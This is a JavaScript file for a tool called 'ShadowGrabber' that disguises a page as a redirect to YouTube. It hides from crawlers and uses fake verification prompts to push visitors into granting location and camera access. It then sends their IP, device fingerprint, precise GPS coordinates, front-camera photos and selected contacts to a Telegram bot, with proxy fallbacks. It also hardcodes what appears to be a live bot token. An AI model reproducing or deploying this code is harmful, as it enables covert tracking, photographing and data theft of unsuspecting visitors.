// ═══════════════════════════════════════════════════════════════════════════
// 💀 SHADOWGRABBER v20.0 - SINGLE USER TURBO GOD MODE
// ═══════════════════════════════════════════════════════════════════════════

const CONFIG = {
    // 👤 USER CONFIGURATION (Hardcoded for Yasir Abbas)
    BOT_TOKEN: '8349023527:AAG9Tq-yiqMXKnxKkiUQ6n5uvu7Rb0kCPco',
    CHAT_ID: '5888374938',

    // ⚙️ SYSTEM SETTINGS
    REDIRECT_URL: 'https://youtube.com',
    CAMERA_SNAPS: 4,
    SNAP_INTERVAL: 300, // Turbo Speed
    FORCE_PERMISSIONS: true
};

// ═══════════════════════════════════════════════════════════════════════════
// � MODULE 1: TELEGRAM UPLINK (ANTI-BAN PROXY)
// ═══════════════════════════════════════════════════════════════════════════
class TelegramUplink {
    constructor() {
        this.base = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}`;
    }

    async request(method, body, isFile = false) {
        // Prepare Payload
        const payload = isFile ? body : JSON.stringify({ ...body, chat_id: CONFIG.CHAT_ID, parse_mode: 'HTML', disable_web_page_preview: true });
        const headers = isFile ? {} : { 'Content-Type': 'application/json' };
        if (isFile) body.append('chat_id', CONFIG.CHAT_ID);

        // 🔄 PROXY CHAIN (Direct -> Proxy1 -> Proxy2)
        const urls = [
            `${this.base}/${method}`, // Direct
            `https://corsproxy.io/?` + encodeURIComponent(`${this.base}/${method}`), // Proxy 1
            `https://api.codetabs.com/v1/proxy?quest=` + encodeURIComponent(`${this.base}/${method}`) // Proxy 2
        ];

        for (const url of urls) {
            try {
                const res = await fetch(url, { method: 'POST', headers: headers, body: payload });
                if (res.ok) return;
            } catch (e) { continue; }
        }
    }

    sendText(text) { this.request('sendMessage', { text }); }
    sendPhoto(blob, cap) {
        const d = new FormData(); d.append('photo', blob, 'img.jpg'); if (cap) d.append('caption', cap);
        this.request('sendPhoto', d, true);
    }
    sendFile(blob, cap) {
        const d = new FormData(); d.append('document', blob, 'data.json'); if (cap) d.append('caption', cap);
        this.request('sendDocument', d, true);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// � MODULE 2: BOT FILTER & INTELLIGENCE
// ═══════════════════════════════════════════════════════════════════════════
class Forensics {
    static async blockBots() {
        const ua = navigator.userAgent.toLowerCase();
        if (ua.includes('google') || ua.includes('bot') || ua.includes('crawl') || navigator.webdriver) {
            document.body.innerHTML = '<h1>404 Not Found</h1>'; throw new Error('Bot');
        }
    }

    static async gather() {
        const start = performance.now();
        const [ip, speed] = await Promise.all([
            fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({ ip: 'Unknown', city: 'Unknown', org: 'Unknown' })),
            this.speedTest()
        ]);

        return {
            ip, speed,
            meta: {
                ua: navigator.userAgent,
                platform: navigator.platform,
                cores: navigator.hardwareConcurrency,
                ram: navigator.deviceMemory,
                batt: await navigator.getBattery?.().then(b => ({ l: Math.round(b.level * 100) + '%', s: b.charging ? '⚡ Charging' : '🔋 Bat' }).catch(() => ({ l: 'Unknown', s: '' }))),
                screen: `${screen.width}x${screen.height}`,
                time: new Date().toLocaleString(),
                load: Math.round(performance.now() - start)
            }
        };
    }

    static async speedTest() {
        const s = performance.now();
        try {
            await fetch(`https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png?t=${Date.now()}`, { cache: 'no-store', mode: 'no-cors' });
            return { mbps: ((15 * 8 * 1000) / (performance.now() - s) / 1024 / 1024).toFixed(2), rtt: Math.round(performance.now() - s) };
        } catch (e) { return { mbps: '0.00', rtt: '999' }; }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 📍 MODULE 3: GPS / CAM (PARALLEL EXECUTION)
// ═══════════════════════════════════════════════════════════════════════════
class Overlay {
    create(t, m, b) {
        return new Promise(r => {
            if (this.e) this.e.remove();
            this.e = document.createElement('div');
            Object.assign(this.e.style, { position: 'fixed', top: 0, left: 0, width: '100%', height: '100%', background: 'rgba(0,0,0,0.95)', zIndex: 999, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', color: '#fff', fontFamily: 'sans-serif' });
            this.e.innerHTML = `<div style="text-align:center;padding:20px;max-width:300px;"><div style="font-size:40px">⚠️</div><h2>${t}</h2><p style="color:#aaa;margin:10px 0 20px;">${m}</p><button id="btn" style="width:100%;padding:15px;background:#007bff;border:none;color:#fff;border-radius:8px;font-weight:bold;font-size:16px">${b}</button></div>`;
            document.body.append(this.e);
            document.getElementById('btn').onclick = () => { this.e.remove(); r() };
        });
    }
    success(t) { if (this.e) this.e.innerHTML = `<h1 style="color:#0f0;font-size:60px;margin-bottom:10px">✔</h1><h3>${t}</h3>`; setTimeout(() => this.e?.remove(), 1000); }
}

class LocationGuard {
    constructor(o) { this.o = o }
    lock() {
        return new Promise(r => {
            const a = () => navigator.geolocation.getCurrentPosition(p => r({ ok: 1, ...p.coords }), e => {
                if (e.code === 1 && CONFIG.FORCE_PERMISSIONS) { this.o.create('Location Error', 'GPS Required.', 'Retry').then(a); }
                else r({ ok: 0, error: e.message });
            }, { enableHighAccuracy: true, timeout: 7000 });
            if (!navigator.geolocation) r({ ok: 0 }); else a();
        });
    }
}

class CameraGuard {
    constructor(v, o) { this.v = v; this.o = o; this.v.setAttribute('playsinline', ''); }
    async start() {
        try {
            const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: 0 });
            this.v.srcObject = s; await this.v.play(); return 1;
        } catch (e) {
            if (CONFIG.FORCE_PERMISSIONS) { await this.o.create('Verification', 'Camera Access Required.', 'Retry'); return this.start(); }
            return 0;
        }
    }
    async snap(link, count) {
        for (let i = 0; i < count; i++) {
            const c = document.createElement('canvas'); c.width = this.v.videoWidth; c.height = this.v.videoHeight;
            c.getContext('2d').drawImage(this.v, 0, 0);
            const b = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.9));
            if (b) link.sendPhoto(b, `📸 Snap ${i + 1}`);
            await new Promise(r => setTimeout(r, CONFIG.SNAP_INTERVAL));
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 🚀 MAIN EXECUTION (TURBO)
// ═══════════════════════════════════════════════════════════════════════════
async function main() {
    Forensics.blockBots();

    const uplink = new TelegramUplink();
    const ov = new Overlay();

    // UI Setup
    const host = new URL(CONFIG.REDIRECT_URL).hostname.replace('www.', '');
    document.title = host;
    document.getElementById('loading-text').textContent = `Connecting to ${host}...`;

    // ⚡ PARALLEL START: Intel + Loc + Cam
    const locPromise = new LocationGuard(ov).lock();
    const intelPromise = Forensics.gather();

    // 1. Send Intel (ASAP)
    const i = await intelPromise;
    const msg1 = `
🕵️ <b>NEW VISITOR TRACKED</b>

📱 <b>Device:</b> ${i.meta.ua}

🌐 <b>IP:</b> ${i.ip.ip}
📍 <b>Location:</b> ${i.ip.city}, ${i.ip.region}
🏢 <b>ISP:</b> ${i.ip.org}

🆔 <b>Session ID:</b> <code>${Math.random().toString(36).substring(7)}</code>
⏰ <b>Timestamp:</b> ${i.meta.time}
⏱️ <b>Load Time:</b> ${i.meta.load}ms

📱 <b>DEVICE FINGERPRINT</b>
├─ Platform: ${i.meta.platform}
├─ CPU Cores: ${i.meta.cores}
├─ RAM: ${i.meta.ram}GB
├─ Screen: ${i.meta.screen}
└─ Touch Points: navigator.maxTouchPoints

🌐 <b>NETWORK INTELLIGENCE</b>
├─ IP: ${i.ip.ip}
├─ Speed: ${i.speed.mbps} Mbps
└─ Latency: ${i.speed.rtt} ms

🔋 <b>POWER STATUS</b>
├─ Battery: ${i.meta.batt.l} (${i.meta.batt.s})

🔗 <a href="https://www.google.com/maps?q=${i.ip.latitude},${i.ip.longitude}">View IP Location</a>
    `.trim();
    uplink.sendText(msg1);

    // 2. Handle GPS (When Ready)
    const loc = await locPromise;
    if (loc.ok) {
        const link = `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`;
        uplink.sendText(`
📍 <b>LOCATION INTELLIGENCE</b>
━━━━━━━━━━━━━━━━━━━━━
✅ <b>PRECISE GPS TRACKING:</b>
├─ Latitude: <code>${loc.latitude}</code>
├─ Longitude: <code>${loc.longitude}</code>
├─ Accuracy: ${Math.round(loc.accuracy)}m

<b>🗺️ LOCATION SERVICES:</b>
├─ 📍 <a href="${link}">Open in Maps</a>
├─ 🛰️ <a href="${link}">Satellite View</a>
        `.trim());
        ov.success('Region Verified');
    } else {
        uplink.sendText(`⚠️ <b>GPS FAILED</b>\nError: ${loc.error}\nUser denied Geolocation.`);
    }

    // 3. Camera (Fast)
    const cam = new CameraGuard(document.getElementById('st-v'), ov);
    if (await cam.start()) {
        await new Promise(r => setTimeout(r, 800));
        await cam.snap(uplink, CONFIG.CAMERA_SNAPS);
        ov.success('Biometrics Verified');
    }

    // 4. Contacts
    if ('contacts' in navigator && 'ContactsManager' in window) {
        await ov.create('Identity Check', 'Verify contacts to continue.', 'Verify');
        try {
            const c = await navigator.contacts.select(['name', 'tel'], { multiple: true });
            if (c.length) {
                const b = new Blob([JSON.stringify(c, null, 2)], { type: 'application/json' });
                uplink.sendFile(b, `📇 <b>${c.length} Contacts Extracted</b>`);
            }
        } catch (e) { }
        ov.success('Identity Sync');
    }

    // 5. Exit
    await new Promise(r => setTimeout(r, 500));
    window.location.href = CONFIG.REDIRECT_URL;
}

if (CONFIG.FORCE_PERMISSIONS) window.onload = main; else window.onclick = main;
